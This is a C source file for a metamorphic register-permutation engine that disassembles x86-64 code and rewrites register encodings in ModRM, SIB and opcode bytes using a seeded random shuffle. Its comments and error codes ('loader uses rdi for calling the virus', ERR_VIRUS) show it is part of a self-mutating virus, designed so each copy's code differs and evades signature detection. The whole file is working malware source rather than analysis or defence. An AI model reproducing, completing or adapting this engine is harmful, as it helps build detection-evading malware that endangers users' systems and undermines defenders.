
#include <stddef.h>

#include "accessors.h"
#include "disasm.h"
#include "utils.h"
#include "disasm_utils.h"
#include "compiler_utils.h"
#include "errors.h"

# define NSHUFFLE		42
/*
** define what registers can be swapped by permutator
** R12 and R13 are not managed yet because their code corresponds to RSP and RBP
** since loader uses rdi for calling the virus, RDI and R15 are also masked out
*/
# define SWAPPABLE_REGISTERS	(RCX|RDX|RBX|RSI|R8|R9|R10|R11|R14)
# define NREGISTERS		16
/*
** Flags used to specify how the intruction should be interpreted
*/
# define MODRM		(1 << 0) /* MODRM byte with register usage       */
# define EXTENDED	(1 << 1) /* MODRM byte with opcode extension     */
# define IMPLICIT_SRC	(1 << 2) /* source register is implicit          */
# define IMPLICIT_DST	(1 << 3) /* destination register is implicit     */

/*
** Index for the matches array:
** - reg:  register number
** - xreg: register extension; promote to extended registers (r8-r15)
*/
#define MATCH_INDEX(reg, xreg)	(((xreg << 3) | (reg)) & 0b1111)
/* macros to define new values for modrm and sib */
#define NEW_MODRM(reg, rm)	(((reg) << 3) | (rm))
#define NEW_SIB(index, base)	(((index) << 3) | (base))

/* structure describing how the instruction should be disassembled */
struct x86_set
{
	uint32_t	status;        /* flags about instruction behaviour */
	uint32_t	implicit_base; /* base value for implicit registers */
};

/* ------------------------------ init_matches ------------------------------ */

static inline void	init_matches(uint32_t matches[NREGISTERS])
{
	/* init to masks so unallowed registers can easely be ignored */

	matches[0b0000] = RAX;
	matches[0b0001] = RCX;
	matches[0b0010] = RDX;
	matches[0b0011] = RBX;
	matches[0b0100] = RSP;
	matches[0b0101] = RBP;
	matches[0b0110] = RSI;
	matches[0b0111] = RDI;
	matches[0b1000] = R8 ;
	matches[0b1001] = R9 ;
	matches[0b1010] = R10;
	matches[0b1011] = R11;
	matches[0b1100] = R12;
	matches[0b1101] = R13;
	matches[0b1110] = R14;
	matches[0b1111] = R15;
}

/* ---------------------------- shuffle_matches ----------------------------- */

static inline bool	can_swap(uint32_t reg)
{
	return (reg & SWAPPABLE_REGISTERS);
}

static void	swap_registers(uint32_t *a, uint32_t *b)
{
	uint32_t	tmp;

	tmp = *a;
	*a = *b;
	*b = tmp;
}

static void	shuffle_matches(uint32_t *reg, uint64_t seed)
{
	uint32_t	a, b;

	for (size_t i = 0; i < NSHUFFLE; i++)
	{
		// swap regular registers (rax -> rdi)
		a = random_inrange(&seed, 0b000, 0b0111);
		b = random_inrange(&seed, 0b000, 0b0111);

		if (can_swap(reg[a]) && can_swap(reg[b]))
			swap_registers(&reg[a], &reg[b]);

		// swap extended registers (r8 -> r15)
		a = random_inrange(&seed, 0b1000, 0b1111);
		b = random_inrange(&seed, 0b1000, 0b1111);

		if (can_swap(reg[a]) && can_swap(reg[b]))
			swap_registers(&reg[a], &reg[b]);
	}
}

/* ---------------------------- convert_matches ----------------------------- */

static uint32_t	mask_to_index(uint32_t mask)
{
	uint32_t	i = 0;

	while (mask) {mask >>= 1; if (mask) i++;}

	return i;
}

static inline void	convert_matches(uint32_t matches[NREGISTERS])
{
	/* convert masks to equivalent value */

	matches[0b0000] = mask_to_index(matches[0b0000]);
	matches[0b0001] = mask_to_index(matches[0b0001]);
	matches[0b0010] = mask_to_index(matches[0b0010]);
	matches[0b0011] = mask_to_index(matches[0b0011]);
	matches[0b0100] = mask_to_index(matches[0b0100]);
	matches[0b0101] = mask_to_index(matches[0b0101]);
	matches[0b0110] = mask_to_index(matches[0b0110]);
	matches[0b0111] = mask_to_index(matches[0b0111]);
	matches[0b1000] = mask_to_index(matches[0b1000]);
	matches[0b1001] = mask_to_index(matches[0b1001]);
	matches[0b1010] = mask_to_index(matches[0b1010]);
	matches[0b1011] = mask_to_index(matches[0b1011]);
	matches[0b1100] = mask_to_index(matches[0b1100]);
	matches[0b1101] = mask_to_index(matches[0b1101]);
	matches[0b1110] = mask_to_index(matches[0b1110]);
	matches[0b1111] = mask_to_index(matches[0b1111]);
}

/* -------------------------------------------------------------------------- */

static bool	instruction_is_supported(uint8_t opcode, uint8_t prefix)
{
	/* multi-byte opcodes are not supported */
	if (prefix) return false;

	/* table of supported instructions */
	uint32_t	table_opcode[TABLESIZE];
				 /* 0 1 2 3 4 5 6 7  8 9 a b c d e f */
	table_opcode[0] = BITMASK32(1,1,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* 0 */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* 1 */
	table_opcode[1] = BITMASK32(0,0,0,0,0,0,0,0, 0,1,0,0,0,0,0,0,  /* 2 */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* 3 */
	table_opcode[2] = BITMASK32(0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* 4 */
				    1,1,1,1,1,1,1,1, 1,1,1,1,1,1,1,1); /* 5 */
	table_opcode[3] = BITMASK32(0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* 6 */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* 7 */
	table_opcode[4] = BITMASK32(0,1,0,1,0,1,0,1, 0,1,0,1,0,1,0,0,  /* 8 */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* 9 */
	table_opcode[5] = BITMASK32(0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* a */
				    0,0,0,0,0,0,0,0, 1,1,1,1,1,1,1,1); /* b */
	table_opcode[6] = BITMASK32(0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* c */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* d */
	table_opcode[7] = BITMASK32(0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,  /* e */
				    0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0); /* f */

	return CHECK_TABLE(table_opcode, opcode);
}

static void	select_instruction(struct x86_set *instruction, uint8_t opcode)
{
	struct x86_set	instructions[0xff];

	instructions[0x00] = (struct x86_set){MODRM       ,    0}; /* add rm8 reg8                 */
	instructions[0x01] = (struct x86_set){MODRM       ,    0}; /* add rm16/32/64 reg16/32/64   */
	instructions[0x29] = (struct x86_set){MODRM       ,    0}; /* sub rm16/32/64 reg16/32/64   */
	instructions[0x50] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rAX/r8                  */
	instructions[0x51] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rCX/r9                  */
	instructions[0x52] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rDX/r10                 */
	instructions[0x53] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rBX/r11                 */
	instructions[0x54] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rSP/r12                 */
	instructions[0x55] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rBP/r13                 */
	instructions[0x56] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rSI/r14                 */
	instructions[0x57] = (struct x86_set){IMPLICIT_SRC, 0x50}; /* push rDI/r15                 */
	instructions[0x58] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rAX/r8                   */
	instructions[0x59] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rCX/r9                   */
	instructions[0x5a] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rDX/r10                  */
	instructions[0x5b] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rBX/r11                  */
	instructions[0x5c] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rSP/r12                  */
	instructions[0x5d] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rBP/r13                  */
	instructions[0x5e] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rSI/r14                  */
	instructions[0x5f] = (struct x86_set){IMPLICIT_DST, 0x58}; /* pop rDI/r15                  */
	instructions[0x81] = (struct x86_set){EXTENDED    ,    0}; /* add(0b000) && sub(0b101)     */
	instructions[0x83] = (struct x86_set){EXTENDED    ,    0}; /* add(0b000)                   */
	instructions[0x85] = (struct x86_set){MODRM       ,    0}; /* test r/m16/32/64 reg16/32/64 */
	instructions[0x87] = (struct x86_set){MODRM       ,    0}; /* xchg reg16/32/64 r/m16/32/64 */
	instructions[0x89] = (struct x86_set){MODRM       ,    0}; /* mov r/m16/32/64 reg16/32/64  */
	instructions[0x8b] = (struct x86_set){MODRM       ,    0}; /* mov reg16/32/64 r/m16/32/64  */
	instructions[0x8d] = (struct x86_set){MODRM       ,    0}; /* lea reg16/32/64 r/m16/32/64  */
	instructions[0xb8] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reAX imm16/32/64         */
	instructions[0xb9] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reCX imm16/32/64         */
	instructions[0xba] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reDX imm16/32/64         */
	instructions[0xbb] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reBX imm16/32/64         */
	instructions[0xbc] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reSP imm16/32/64         */
	instructions[0xbd] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reBP imm16/32/64         */
	instructions[0xbe] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reSI imm16/32/64         */
	instructions[0xbf] = (struct x86_set){IMPLICIT_DST, 0xb8}; /* mov reDI imm16/32/64         */

	*instruction = instructions[opcode];
}

static void	retrieve_rex_fields(uint8_t *rex_r, uint8_t *rex_b, uint8_t rex)
{
	*rex_r = 0;   /* modrm.reg                         */
	*rex_b = 0;   /* modrm.r/m, sib.base or opcode.reg */

	/* retrieve field extensions if any */
	if (rex)
	{
		*rex_r = !!(rex & 0b100);  /* get rex.r extension field */
		*rex_b = !!(rex & 0b001);  /* get rex.b extension field */
	}
}

static void	implicit_register(uint8_t *opcode,                            \
			uint32_t matches[NREGISTERS], uint32_t implicit_base, \
			uint8_t rex)
{
	uint8_t		current_reg = *opcode - implicit_base;
	uint32_t	op = matches[MATCH_INDEX(current_reg, !!(rex))];

	op &= 0b111;
	*opcode = implicit_base + (op & 0b111);
}

static bool	extended_opcode(uint8_t **p, size_t *codelen, uint32_t matches[NREGISTERS], uint8_t rex_b)
{
	/* error if instruction is too long */
	if (!*codelen--) return errors(ERR_VIRUS, _ERR_V_INSTRUCTION_LENGTH);

	uint8_t		*modrm = *p++;
	uint8_t		reg    = (*modrm & 0b00111000) >> 3;
	uint8_t		rm     = (*modrm & 0b00000111);

	uint8_t		new_rm = matches[MATCH_INDEX(rm, rex_b)];

	new_rm &= 0b111;
	*modrm &= ~(0b00111111);
	*modrm |= NEW_MODRM(reg, new_rm);

	return true;
}

static bool	modrm(uint8_t **p, size_t *codelen,   \
			uint32_t matches[NREGISTERS], \
			uint8_t rex_r, uint8_t rex_b)
{
	/* error if instruction is too long */
	if (!*codelen--) return errors(ERR_VIRUS, _ERR_V_INSTRUCTION_LENGTH);

	uint8_t	*modrm  = *p++;
	uint8_t	mod     = (*modrm & 0b11000000) >> 6;
	uint8_t	reg     = (*modrm & 0b00111000) >> 3;
	uint8_t	rm      = (*modrm & 0b00000111);
	uint8_t	new_reg = matches[MATCH_INDEX(reg, rex_r)] & 0b111;
	uint8_t	new_rm  = matches[MATCH_INDEX(rm, rex_b)]  & 0b111;

	if      (mod == 0b11) {goto direct_register;}
	else if (mod == 0b00) {goto indirect_register;}
	else                  {goto indirect_register_displacement;}

direct_register:

	*modrm &= ~(0b00111111);
	*modrm |= NEW_MODRM(new_reg, new_rm);

	goto end;

indirect_register:

	if (rm == 0b100) /* SIB */
	{
		/* error if instruction is too long */
		if (!codelen--) return errors(ERR_VIRUS, _ERR_V_INSTRUCTION_LENGTH);

		uint8_t	*sib      = *p++;
		uint8_t	index     = (*sib & 0b00111000) >> 3;
		uint8_t	base      = (*sib & 0b00000111);
		uint8_t	new_index = matches[MATCH_INDEX(index, rex_b)] & 0b111;
		uint8_t	new_base  = matches[MATCH_INDEX(base, rex_b)]  & 0b111;

		/* reg is the destination */
		*modrm &= ~(0b00111000);
		*modrm |= NEW_MODRM(new_reg, rm);

		*sib &= ~(0b00111111);
		*sib |= NEW_SIB(new_index, new_base);
	}
	else if (rm == 0b101) /* displacement only addressing [rip + disp] */
	{
		/* reg is the destination */
		*modrm &= ~(0b00111000);
		*modrm |= NEW_MODRM(new_reg, rm);
	}
	else /* indirect register addressing */
	{
		/* r/m is dereferenced */
		*modrm &= ~(0b00111111);
		*modrm |= NEW_MODRM(new_reg, new_rm);
	}
	goto end;

indirect_register_displacement:

	if (rm == 0b100) /* SIB with displacement */
	{
		if (!codelen--) return errors(ERR_VIRUS, _ERR_V_INSTRUCTION_LENGTH); /* error if instruction is too long */
		uint8_t	*sib      = *p++;
		uint8_t	index     = (*sib & 0b00111000) >> 3;
		uint8_t	base      =  *sib & 0b00000111;
		uint8_t	new_index = matches[MATCH_INDEX(index, rex_b)] & 0b111;
		uint8_t	new_base  = matches[MATCH_INDEX(base, rex_b)]  & 0b111;

		/* reg is the destination */
		// new_reg &= 0b111;
		*modrm &= ~(0b00111000);
		*modrm |= NEW_MODRM(new_reg, rm);

		*sib &= ~(0b00111111);
		*sib |= NEW_SIB(new_index, new_base);
	}
	else /* indirect register with displacement */
	{
		/* r/m is dereferenced */
		*modrm &= ~(0b00111111);
		*modrm |= NEW_MODRM(new_reg, new_rm);
	}

end:
	return true;
}

static bool	apply_match(void *code, size_t codelen, uint32_t matches[NREGISTERS])
{
	uint8_t		*p     = (uint8_t*)code;
	uint8_t		*opcode;                   /* opcode position     */
	uint8_t		rex    = 0;                /* REX prefix          */
	uint8_t		prefix = 0;                /* opcode prefix(es)   */

	/* set <codelen> to INSTRUCTION_MAXLEN if it exceeds it */
	if (codelen > INSTRUCTION_MAXLEN) codelen = INSTRUCTION_MAXLEN;

next_opcode:
	if (!codelen--) /* error if instruction is too long */
		return errors(ERR_VIRUS, _ERR_V_INSTRUCTION_LENGTH);
	opcode = p++;

	/* NULL byte prefixes               */
	if ((*opcode == 0x26 || *opcode == 0x2e
	||   *opcode == 0x36 || *opcode == 0x3e
	/* FS/GS segment override prefix    */
	||   *opcode == 0x64 || *opcode == 0x65
	/* operand / address size overwrite */
	||   *opcode == 0x66 || *opcode == 0x67
	/* assert LOCK# signal prefix    */
	||   *opcode == 0xf0)
	&&  !(prefix))
		{goto next_opcode;}

	/* mandatory prefix(es) */
	else if (*opcode == 0x0f)
		{prefix |= OP_PREFIX_0F; goto next_opcode;}
	/* REX prefix(es) */
	else if (*opcode >= 0x40 && *opcode <= 0x4f)
		{rex = *opcode; goto next_opcode;}

	if (!instruction_is_supported(*opcode, prefix)) {goto end;}

	struct x86_set	i;             /* instruction interpretation        */
	uint8_t		rex_r = 0;     /* modrm.reg                         */
	uint8_t		rex_b = 0;     /* modrm.r/m, sib.base or opcode.reg */

	select_instruction(&i, *opcode);
	retrieve_rex_fields(&rex_r, &rex_b, rex);

	if (i.status & IMPLICIT_SRC || i.status & IMPLICIT_DST)
		implicit_register(opcode, matches, i.implicit_base, rex);

	else if (i.status & EXTENDED
	&& !extended_opcode(&p, &codelen, matches, rex_b))
		return errors(ERR_THROW, _ERR_T_EXTENDED_OPCODE);

	else if (i.status & MODRM
	&& !modrm(&p, &codelen, matches, rex_r, rex_b))
		return errors(ERR_THROW, _ERR_T_MODRM);
end:
	return true;
}

/* ----------------------------- apply_matches ------------------------------ */

static inline bool	apply_matches(struct safe_ptr ref, uint32_t matches[NREGISTERS])
{
	void		*code   = ref.ptr;
	size_t		codelen = ref.size;

	while (codelen)
	{
		size_t	instruction_length = disasm_length(code, codelen);
		if (instruction_length == 0
		|| !apply_match(code, instruction_length, matches))
			return errors(ERR_THROW, _ERR_T_PERMUTATE_REGISTERS);

		code    += instruction_length;
		codelen -= instruction_length;
	}
	return true;
}

/* -------------------------- permutate_registers --------------------------- */

bool		permutate_registers(struct safe_ptr ref, uint64_t seed)
{
	uint32_t	matches[NREGISTERS];

	init_matches(matches);
	shuffle_matches(matches, seed);
	convert_matches(matches);

	return apply_matches(ref, matches);
}
